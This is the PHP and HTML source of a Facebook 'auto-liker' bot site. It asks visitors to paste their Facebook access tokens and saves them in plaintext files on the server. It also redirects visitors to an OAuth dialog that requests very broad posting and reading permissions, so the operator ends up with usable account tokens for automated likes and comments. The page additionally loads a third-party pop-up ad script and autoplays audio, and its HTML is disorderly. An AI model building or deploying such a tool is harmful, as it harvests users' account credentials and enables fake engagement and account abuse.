<a target="_blank" href="http://free-web-tools.com/category/codes/javascript/" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute"></a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none"></a>
﻿﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>
<head>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Hacking Concept -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5066680227575398"
     data-ad-slot="8304817587"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>• ZAIN AQDAS •</title><link rel="stylesheet" type="text/css" href="css.css" media="all,handheld"/><link rel="shortcut icon" a href="http://sco10.com/favicon/lg_favicon.gif">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>CHAUDHRY BOTTER</title><link rel="stylesheet" type="text/css" href="Stylesheet.css"
<link href="new.css" rel="stylesheet" type="text/css"><link  rel="stylesheet" type="text/css" href="new.css" media="all"><link href="http://fonts.googleapis.com/css?family=Sniglet" rel="stylesheet" type="text/css"><link href="http://fonts.googleapis.com/css?family=Spirax" rel="stylesheet" type="text/css">
  <!-- Ekran Açılışı...-->
<script>
var width=document.body.clientWidth;
var height=document.body.clientHeight;
function doClickText(who,type,step,timeOut) {
document.getElementById(who).style.display="none";
if(type==0) {
reveal('revealDiv1',step,timeOut,0);
reveal('revealDiv2',step,timeOut,1);}
if(type==1) {
reveal('revealDiv1',step,timeOut,2);
reveal('revealDiv2',step,timeOut,3);}}
function reveal(who,step,timeOut,type) {
if(type==0)
var where="top";
if(type==1)
var where="bottom";
if(type==2)
var where="left";
if(type==3)
var where="right";
eval('var temp=document.getElementById(who).style.'+where);
temp=parseInt(temp);
if(type==0||type==1)
var checkWith=height/2;
if(type==2||type==3)
var checkWith=width/2;
if(-temp<checkWith) {
temp-=step;
eval('document.getElementById(who).style.'+where+'=temp;');
setTimeout("reveal('"+who+"',"+step+",'"+timeOut+"',"+type+")", timeOut);}
else {
document.getElementById(who).style.display="none";
document.body.scroll="yes";}}
function initReveal(type,div1bg,div2bg,div1bw,div2bw,div1bc,div2bc,step,timeOut,click) {
if(type==0) {
var bWhere1="border-bottom";
var bWhere2="border-top";
var putZero1="top:0px; left:0px";
var putZero2="bottom:0px; left:0px";
document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
if(!click) {
reveal('revealDiv1',step,timeOut,0);
reveal('revealDiv2',step,timeOut,1);}
else {
clickText(type,step,timeOut);}}
if(type==1) {
var bWhere1="border-right";
var bWhere2="border-left";
var putZero1="top:0px; left:0px";
var putZero2="top:0px; right:0px";
document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
if(!click) {
reveal('revealDiv1',step,timeOut,2);
reveal('revealDiv2',step,timeOut,3);}
else {
clickText(type,step,timeOut);}}
function clickText(type,step,timeOut) {
document.write('<div id="clickText" style="z-index:101; display:block; position:absolute; top:'+(height/2-clickh/2-clickb)+'; left:'+(width/2-clickw/2-clickb)+'"><table style="border:'+clickc+' solid '+clickb+'px; background:'+clickbg+' ;width:'+clickw+'px; height:'+clickh+'; '+clickFont+'; cursor:hand; cursor:pointer" onClick="doClickText(\'clickText\','+type+','+step+','+timeOut+')"><tr><td align="middle">'+clickt+'</td></tr></table></div>');}}
</script>
<script>
var clickw=300;
var clickh=30;
var clickb=3;
var clickc="rgb(65, 255, 0)";
var clickbg="black"; // Background color
var clickt="⚠ Click Here To Enter Site"; // Text to display
var clickFont="font-family:Tahoma,arial,helvetica; font-size:10pt; font-weight:bold; color:#54A847"; // The font style of the text
new initReveal(0,'black','black',1,1,'black','black',3,10,true);
</script>

<?php

$bot=new bot();
class bot{

public function getGr($as,$bs){
$ar=array(
'graph',
'fb',
'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
}else{
$else=$ar;
}
foreach($else as $b => $c){
$XD[]=$b.'='.$c;
}
$true='?'.implode('&',$XD);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
return $true[data];
}else{
return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION by ABDUL SABOOR',
));
$ch=curl_exec($cx);
curl_close($cx);
return ($ch);
}

public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('XD')){
mkdir('XD');
}
if($bb){
$blue=fopen('XD/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
fclose($blue);

echo'<script type="text/javascript">alert("INFO : Text robot telah dibuat")</script>';
}else{
if($z){
if(file_exists('XD/'.$id)){
$file=file_get_contents('XD/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('XD/'.$id,'w');
fwrite($xs,$str);
fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('XD/'.$id,'w');
fwrite($xs,$str);
fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('XD/'.$id);
$file=explode('*',$file);
if($file[5]){
$up=fopen('XD/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
fclose($up);
}else{
$up=fopen('XD/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
fclose($up);
}
echo'<script type="text/javascript">alert("INFO : Data Successfully Saved")</script>';}}
}

public function lOgbot($d){
unlink('XD/'.$d);
unset($_SESSION[key]);
echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

$this->atas();
$this->home();
$this->bwh();
}

public function cek($tok,$id,$nm){
$if=file_get_contents('XD/'.$id);
$if=explode('*',$if);
if(preg_match('/on/',$if[1])){
$satu='on';
$ak='Like & Comment';
}else{
$satu='off';
$ak='Like Only';
}
if(preg_match('/on/',$if[2])){
$dua='on';
$ik='Bot emo';
}else{
$dua='off';
$ik='Bot manual';
}
if(preg_match('/on/',$if[3])){
$tiga='on';
$ek='Powered on';
}else{
$tiga='off';
$ek='Powered off';
}
if(preg_match('/on/',$if[4])){
$empat='on';
$uk='Text via script';
}else{
$empat='off';
$uk='Text via Self';
}
echo'
<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">Robot User '.$nm.'</a></h3>
<ul>
<li>
Welcome To chaudhrys botter Bot Site : <font color="red">'.$nm.'</font></li>
<li>
<a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<input type="submit" value="Logout Bot"></form></li>
<li>
<form action="index.php" method="post">
Select Menu Robot</li>
<li>
<select name="likes">';
if($satu=='on'){
echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="off">
Like Only</option>
</select>';
}else{
echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="on">
Like & Comment</option>
</select>';
}
echo'</li>
<li>
<select name="emot">';
if($dua=='on'){
echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="off">
Bot manual</option>
</select>';
}else{
echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="on">
Bot emo</option>
</select>';
}
echo'</li>
<li>
<select name="target">';
if($tiga=='on'){
echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="off">
Powered off</option>
</select>';
}else{
echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="on">
Powered on</option>
</select>';
}
echo'</li>
<li>';
if($empat=='on'){
echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="off">
Text via self</option>
</select>';
}else{
if($if[5]){
echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="text">
Input Your Text
</option>
<option value="on">
Text via script</option>
</select>';
}else{
echo'
Type Your Text
<br>
<input type="text" name="text" style="height:30px;">
<input type="hidden" name="opsi" value="'.$empat.'">';}
}
echo'
</li>
</ul></div>

<div id="top-content">
<div id="search-form">
<input type="submit" value="SAVE"></form>
</div></div></div>';

$this->membEr();
}

public function atas(){
$hari=array(1=>
"Monday",
"Tuesday",
"Wednesday",
"Thursday",
"Friday",
"Saturday",
"Sunday"
);

$bulan=array(1=>
"January",
"February",
"March",
"April",
"May",
"June",
"July",
"August",
"September",
"October",
"November",
"Desember"
);

$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);

echo'
<br>
<br>
<font size="40"><marquee behavior="alternate">
<script src="B.js"></script></marquee></font>
<br>
<br>
<hr> </div>
';
}
public function home(){
echo'
</h2></center></div>
<div id="content">
<div class="post">
<br>
<br>
<center><a target="_blank" href="https://www.facebook.com/100022109400923"><img src="https://graph.facebook.com/100022109400923/picture?width=900" alt="" style="border-radius: 50px; border: 2px; box-shadow: 0px 0px 7px 2px 	#42f4f1; padding: 0px;" width="250" height="250" title=""/><a target="_blank" href="https://www.facebook.com/100022109400923"><img src="https://graph.facebook.com/100022109400923/picture?width=900" alt="" style="border-radius: 50px; border: 2px; box-shadow: 0px 0px 7px 2px 	#42f4f1; padding: 0px;" width="300" height="300" title=""/><a target="_blank" href="https://www.facebook.com/100023283004150"><img src="https://graph.facebook.com/100022109400923/picture?width=900" alt="" style="border-radius: 50px; border: 2px; box-shadow: 0px 0px 7px 2px 	#42f4f1; padding: 0px;" width="250" height="250" title=""/></a>
<br>
<br>
<hr></div></div></div></div>


<br>
<center>
<br></iframe>';
}

public function bwh(){
echo'
<div id="bottom-content">
<div id="navigation-menu">
<font style="color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em red; color: #fff ;font-family: Sniglet, cursive;font-size:40px;">☣<font color="yellow"> Admin Area</font>☣</font><br><br>
<center><a href="https://www.facebook.com/100022109400923" target="_blank"><input class="button" type="button" value="Meet Admin"></a><br><a href="http://zainu.dx.am/" target="_blank"><input class="button" type="button" value="Get Token"></a>
</center>
<br>
<hr><div>
<br>
<br>
<font style="color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em red; color: #fff ;font-family: Sniglet, cursive;font-size:40px;">☣<font color="yellow"> Use One Of The Following Sites</font>☣</font><br><br>
<br>
<hr> </div>
<br>
<div id="top-content">		
<div id="search-form">			
<form action="index.php" method="post">				<input class="inp-text" type="text1" placeholder=" Paste Your Token Here " name="token">				<button id="submit" class="button button2"> Save </button></form></div></div></div><center>
 </div></div></div>';
$this->membEr();
}
public function membEr(){
if(!is_dir('XD')){
mkdir('XD');
}
$up=opendir('XD');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
$user[]=$use;}
}

echo'
<div id="footer">
<font style="color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em red; color: #fff ;font-family: Sniglet, cursive;font-size:40px;"><font color="yellow"> Active Users : '.count($user).' 😀 </font>
<br>
<font style="color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em red; color: #fff ;font-family: Sniglet, cursive;font-size:40px;"><font color="yellow"> Script Designed By : Zain Aqdas </font></font>
';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
$a=$_SESSION[key];
$ai=explode('_',$a);
$a=$ai[0];
if($_POST[logout]){
$ax=$_POST[logout];
$bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
$as=$_POST[likes];
$bs=$_POST[emot];
$bx=$_POST[target];
$cs=$_POST[opsi];
$tx=$_POST[text];
if($cs=='text'){
unlink('XD/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
}else{
if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
}else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
$bot->atas();
$bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
unset($_SESSION[key]);
unlink('XD/'.$ai[1]);
$bot->atas();
$bot->home();
$bot->bwh();}}
}else{
if($_POST[token]){
$a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
}else{
$cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
$bot->atas();
$bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Token invalid")</script>';
$bot->atas();
$bot->home();
$bot->bwh();}
}else{
if($_GET[token]){
$a=$_GET[token];
$bot->toXen($a);
}else{
$bot->atas();
$bot->home();
$bot->bwh();}}
}
?>
<audio autoplay loop>
      <source src="http://songolum.com/files/4QiWVeaoH.mp3">
</audio>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cfhugonpbd"></script>